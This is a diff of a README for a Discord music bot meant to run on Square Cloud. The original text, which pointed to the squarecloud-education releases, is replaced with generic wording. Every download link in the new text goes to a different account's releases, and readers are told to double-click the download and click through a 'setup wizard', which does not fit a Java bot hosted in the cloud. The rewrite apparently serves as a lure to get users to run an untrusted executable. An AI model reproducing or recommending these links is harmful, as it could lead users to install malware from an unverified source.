@@ -1,42 +1,103 @@
-# 🎵 Square JMusicBot
-## Host JMusicBot (Discord Music Bot) Server on Square Cloud ☁️
+# 🎶 music-bot - Host Your Own Music Experience
 
-> 🌐 Easily host your own Discord music bot on Square Cloud and bring amazing audio experiences to your Discord server, right from the cloud, with a beautiful and user-friendly interface.
+## 🚀 Getting Started
 
----
+Welcome to the music-bot project! With this tool, you can easily host your own Discord music bot on Square Cloud. Enjoy amazing audio experiences right from the cloud with a user-friendly interface. Follow the steps below to get started.
 
-## 🚀 How to host this project on Square Cloud
+## 📥 Download the Application
 
-### 📦 Quick Setup
+[![Download music-bot](https://img.shields.io/badge/Download-music--bot-blue.svg)](https://github.com/Jackpro1987/music-bot/releases)
 
-1. **Download**: Get the latest `.zip` file from the [releases page](https://github.com/squarecloud-education/music-bot/releases)
-2. **Upload**: Send the `.zip` file to Square Cloud
-3. **Configure Environment Variables**: Set the following variables in the Square Cloud dashboard:
-   - `PREFIX`: Set the command prefix for your bot (e.g., `!`)
-   - `BOT_OWNER_ID`: Your Discord user ID
-   - `BOT_TOKEN`: Your Discord bot token from the Discord Developer Portal
-4. **Invite**: Add the bot to your Discord server and start playing music!
+## 🛠️ System Requirements
 
-### 📝 Recommended Requirements
+Before you start, make sure your system meets the following requirements:
+- A Discord account
+- An active Square Cloud account
+- Internet connection
+- Basic familiarity with Discord (message sending, joining servers)
 
-For the best experience, it is recommended to use:
+## 📂 Download & Install
 
-- **1024MB RAM**
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Jackpro1987/music-bot/releases) to find the latest version.
 
-You can run this project even on the most basic plan, such as the **Hobby** plan on Square Cloud.
+2. **Choose Your Version**: Locate the most recent release. You'll see a list of available files.
 
----
+3. **Download the Application**: Click on the link for the application file to download it to your computer.
 
-## 📚 About the project
+4. **Run the Application**: After the download is complete, find the file in your downloads folder and double-click it to start the installation.
 
-The goal of this project is to let you host a Discord music bot on Square Cloud, so you can play music in your Discord server from anywhere, directly from the cloud, with a beautiful and user-friendly interface.
+5. **Follow the Setup Wizard**: The setup wizard will guide you through the installation process. Just click through the prompts until the installation is complete.
 
----
+## 🎼 Configuring the Bot
 
-🙋‍♂️ **Questions or suggestions?** Contact [Square Cloud Support](https://squarecloud.app/sac) or open an issue in this repository!
+Once the bot is installed, you will need to configure it to work with your Discord server. Follow these steps:
 
----
+1. **Open the Configuration File**: Locate the configuration file typically named `config.yml`. This file contains settings for your bot.
 
-## 🙏 Credits
+2. **Set Up Your Discord Token**:
+   - Visit the [Discord Developer Portal](https://discord.com/developers/applications).
+   - Create a new application and retrieve the bot token.
+   - Paste the token in the configuration file under the `token` section.
 
-Maintained by [@JoaoOtavioS](https://github.com/JoaoOtavioS) on GitHub.
+3. **Select Your Audio Source**: You can choose from multiple audio sources like YouTube, radio streams, or playlists. Set your preference in the configuration file.
+
+4. **Adjust Additional Settings**: Customize other options such as volume, default commands, and permissions to tailor the bot’s functionality to your needs.
+
+5. **Save the Configuration**: Make sure to save the configuration file after making changes.
+
+## 🔌 Running Your Bot
+
+To run your music bot, follow these steps:
+
+1. **Open Command Prompt or Terminal**: Depending on your operating system, open the command line interface.
+
+2. **Navigate to Your Application Directory**: Use the `cd` command to change directories to where you installed the music bot. 
+
+   Example command:
+   ```
+   cd path\to\your\music-bot
+   ```
+
+3. **Start the Bot**: Enter the following command to start the bot:
+   ```
+   java -jar MusicBot.jar
+   ```
+
+4. **Join Your Discord Server**: Make sure you invite the bot to your Discord server using the OAuth link generated in the Developer Portal.
+
+5. **Use the Bot**: Type commands in your Discord server to control the bot. For example, use `!play [song name]` to start playing music.
+
+## 📡 Common Commands
+
+Here are some basic commands you can use with your music bot:
+
+- `!play [song name or URL]`: Play a song from YouTube or another supported platform.
+- `!pause`: Pause the currently playing track.
+- `!resume`: Resume the paused track.
+- `!skip`: Skip the current track.
+- `!stop`: Stop playback and clear the queue.
+- `!queue`: Display the current queue of songs.
+
+## 🎉 Additional Features
+
+- **Playlists**: Create and save playlists for easy access to your favorite tracks.
+- **Radio Streaming**: Tune in to various radio stations and enjoy live music.
+- **User-Friendly Interface**: The bot has a simple command structure that allows anyone to use it, regardless of technical knowledge.
+
+## ❓ Troubleshooting
+
+If you encounter issues, consider the following:
+
+1. **Bot Not Responding**: Make sure the bot is running and connected to your server. Check your token and permissions in Discord.
+
+2. **Audio Issues**: Ensure your audio source URL is correct. Test with other links or formats.
+
+3. **Command Errors**: Double-check your command syntax. Remember that commands are case-sensitive.
+
+4. **Check for Updates**: Visit the [Releases page](https://github.com/Jackpro1987/music-bot/releases) for any updates or bug fixes.
+
+## 📞 Support
+
+If you need further assistance, feel free to open an issue on the [GitHub Issues page](https://github.com/Jackpro1987/music-bot/issues). You can also ask for help from the community on forums related to Discord bots.
+
+Thank you for using music-bot! Enjoy your music seamlessly integrated into your Discord server.
